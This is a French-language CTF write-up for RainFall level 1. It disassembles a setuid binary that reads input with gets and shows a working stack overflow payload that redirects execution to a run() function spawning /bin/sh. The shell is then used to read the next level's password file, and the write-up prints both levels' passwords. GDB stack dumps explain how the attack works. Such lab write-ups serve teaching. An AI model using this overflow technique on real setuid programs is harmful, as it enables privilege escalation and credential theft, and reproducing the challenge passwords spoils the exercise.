# LEVEL 1

### Reconnaissance

On se connect au level1 avec le mot de passe : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

On trouve un binaire:
```
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
level1@RainFall:~$ file level1 
level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

On test le binaire qui attend un input:
```
level1@RainFall:~$ ./level1 
ssss
level1@RainFall:~$ ./level1 
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
Segmentation fault (core dumped)
```

Segfault, sa sent le buffer overflow ...
On le télécharge sur notre machine et on le désassemble avec r2:
```
[...]
┌ 23: int main (int argc, char **argv, char **envp);
│           ; var char *s @ esp+0x10
│           0x08048480      55             push ebp
│           0x08048481      89e5           mov ebp, esp
│           0x08048483      83e4f0         and esp, 0xfffffff0
│           0x08048486      83ec50         sub esp, 0x50
│           0x08048489      8d442410       lea eax, dword [s]
│           0x0804848d      890424         mov dword [esp], eax        ; char *s
│           0x08048490      e8abfeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x08048495      c9             leave
└           0x08048496      c3             ret
[0x08048390]> q
```

On a un fgets qui attend donc une entrée avec un buffer de 76.
A t'on une autre fonction interessante dans le binaire ? La réponse est oui !

On a la fonction run:
```
[0x08048390]> pdf@sym.run
┌ 60: sym.run ();
│           ; var size_t size @ esp+0x4
│           ; var size_t nitems @ esp+0x8
│           ; var FILE *stream @ esp+0xc
│           0x08048444      55             push ebp
│           0x08048445      89e5           mov ebp, esp
│           0x08048447      83ec18         sub esp, 0x18
│           0x0804844a      a1c0970408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x80497c0:4]=0
│           0x0804844f      89c2           mov edx, eax
│           0x08048451      b870850408     mov eax, str.Good..._Wait_what ; 0x8048570 ; "Good... Wait what?\n"
│           0x08048456      8954240c       mov dword [stream], edx     ; FILE *stream
│           0x0804845a      c74424081300.  mov dword [nitems], 0x13    ; [0x13:4]=-1 ; 19 ; size_t nitems
│           0x08048462      c74424040100.  mov dword [size], 1         ; size_t size
│           0x0804846a      890424         mov dword [esp], eax        ; const void *ptr
│           0x0804846d      e8defeffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│           0x08048472      c70424848504.  mov dword [esp], str.bin_sh ; [0x8048584:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x08048479      e8e2feffff     call sym.imp.system         ; int system(const char *string)
│           0x0804847e      c9             leave
└           0x0804847f      c3             ret
[0x08048390]> q
```
Cette fonction lance un /bin/sh, parfait!

### Exploitation

```
level1@RainFall:~$ python -c 'print "A" * 76 + "D\x84\x04\x08"' | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
```

Ok, on est bon, il faut juste qu'on garde l'entrée standart ouvert, on va utilisé cat.

```
level1@RainFall:~$ (python -c 'print "A" * 76 + "D\x84\x04\x08"';cat) | ./level1 
Good... Wait what?
ls
ls: cannot open directory .: Permission denied
cat .pass
cat: .pass: Permission denied
id           
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Et voila :)

### Comment sa marche ?

- La stack avant fgets:
```
EAX: 0xffffcf80 --> 0xf7fa4000 --> 0x1dfd6c 
EBX: 0x0 
ECX: 0x66a37582 
EDX: 0xffffcff4 --> 0x0 
ESI: 0xf7fa4000 --> 0x1dfd6c 
EDI: 0xf7fa4000 --> 0x1dfd6c 
EBP: 0xffffcfc8 --> 0x0 
ESP: 0xffffcf70 --> 0xffffcf80 --> 0xf7fa4000 --> 0x1dfd6c 
EIP: 0x8048490 (<main+16>:	call   0x8048340 <gets@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048486 <main+6>:	sub    esp,0x50
   0x8048489 <main+9>:	lea    eax,[esp+0x10]
   0x804848d <main+13>:	mov    DWORD PTR [esp],eax
=> 0x8048490 <main+16>:	call   0x8048340 <gets@plt>
   0x8048495 <main+21>:	leave  
   0x8048496 <main+22>:	ret    
   0x8048497:	nop
   0x8048498:	nop
Guessed arguments:
arg[0]: 0xffffcf80 --> 0xf7fa4000 --> 0x1dfd6c 
[------------------------------------stack-------------------------------------]
0000| 0xffffcf70 --> 0xffffcf80 --> 0xf7fa4000 --> 0x1dfd6c 
0004| 0xffffcf74 --> 0xf7fa4000 --> 0x1dfd6c 
0008| 0xffffcf78 --> 0xf7ffc800 --> 0x0 
0012| 0xffffcf7c --> 0xf7fa7c88 --> 0x0 
0016| 0xffffcf80 --> 0xf7fa4000 --> 0x1dfd6c 
0020| 0xffffcf84 --> 0x804978c --> 0x80496c0 --> 0x1 
0024| 0xffffcf88 --> 0x1 
0028| 0xffffcf8c --> 0x8048321 (<_init+41>:	add    esp,0x8)
```

- la stack apres:
```
EAX: 0xffffcf80 ('A' <repeats 76 times>, "D\204\004\b")
EBX: 0x0 
ECX: 0xf7fa4580 --> 0xfbad2088 
EDX: 0xffffcfd0 --> 0x0 
ESI: 0xf7fa4000 --> 0x1dfd6c 
EDI: 0xf7fa4000 --> 0x1dfd6c 
EBP: 0xffffcfc8 ("AAAAD\204\004\b")
ESP: 0xffffcf70 --> 0xffffcf80 ('A' <repeats 76 times>, "D\204\004\b")
EIP: 0x8048495 (<main+21>:	leave)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048489 <main+9>:	lea    eax,[esp+0x10]
   0x804848d <main+13>:	mov    DWORD PTR [esp],eax
   0x8048490 <main+16>:	call   0x8048340 <gets@plt>
=> 0x8048495 <main+21>:	leave  
   0x8048496 <main+22>:	ret    
   0x8048497:	nop
   0x8048498:	nop
   0x8048499:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffcf70 --> 0xffffcf80 ('A' <repeats 76 times>, "D\204\004\b")
0004| 0xffffcf74 --> 0xf7fa4000 --> 0x1dfd6c 
0008| 0xffffcf78 --> 0xf7ffc800 --> 0x0 
0012| 0xffffcf7c --> 0xf7fa7c88 --> 0x0 
0016| 0xffffcf80 ('A' <repeats 76 times>, "D\204\004\b")
0020| 0xffffcf84 ('A' <repeats 72 times>, "D\204\004\b")
0024| 0xffffcf88 ('A' <repeats 68 times>, "D\204\004\b")
0028| 0xffffcf8c ('A' <repeats 64 times>, "D\204\004\b")
```
- 2 instructions après:
```
EAX: 0xffffcf80 ('A' <repeats 76 times>, "D\204\004\b")
EBX: 0x0 
ECX: 0xf7fa4580 --> 0xfbad2088 
EDX: 0xffffcfd0 --> 0x0 
ESI: 0xf7fa4000 --> 0x1dfd6c 
EDI: 0xf7fa4000 --> 0x1dfd6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcfcc --> 0x8048444 (<run>:	push   ebp)
EIP: 0x8048496 (<main+22>:	ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804848d <main+13>:	mov    DWORD PTR [esp],eax
   0x8048490 <main+16>:	call   0x8048340 <gets@plt>
   0x8048495 <main+21>:	leave  
=> 0x8048496 <main+22>:	ret    
   0x8048497:	nop
   0x8048498:	nop
   0x8048499:	nop
   0x804849a:	nop
[------------------------------------stack-------------------------------------]
0000| 0xffffcfcc --> 0x8048444 (<run>:	push   ebp)
0004| 0xffffcfd0 --> 0x0 
0008| 0xffffcfd4 --> 0xffffd064 --> 0xffffd238 ("/home/yoginet/Documents/101/rainfall/level1/level1")
0012| 0xffffcfd8 --> 0xffffd06c --> 0xffffd26b ("GJS_DEBUG_TOPICS=JS ERROR;JS LOG")
0016| 0xffffcfdc --> 0xffffcff4 --> 0x0 
0020| 0xffffcfe0 --> 0x1 
0024| 0xffffcfe4 --> 0x0 
0028| 0xffffcfe8 --> 0xf7fa4000 --> 0x1dfd6c 
```
On a réussi a mettre sur la stack, la valeur 0x8048444 qui est le début de la fonction run.

- Pour convertir l'adresse : 
```
$ python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x08048444)
'D\x84\x04\x08'
```







